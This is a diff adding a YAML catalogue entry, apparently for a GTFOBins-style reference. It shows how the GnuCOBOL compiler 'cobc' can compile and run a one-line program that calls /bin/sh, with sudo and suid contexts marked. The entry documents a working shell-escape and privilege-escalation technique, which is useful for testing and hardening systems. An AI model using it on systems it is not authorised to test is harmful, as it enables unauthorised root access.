@@ -1,0 +1,14 @@
+---
+functions:
+  shell:
+  - code: |-
+      echo 'CALL "SYSTEM" USING "/bin/sh".' >/path/to/temp-file
+      cobc -xFj --frelax-syntax-checks /path/to/temp-file
+    comment: |-
+      The `/path/to/temp-file` sill be overwritten after the execution.
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
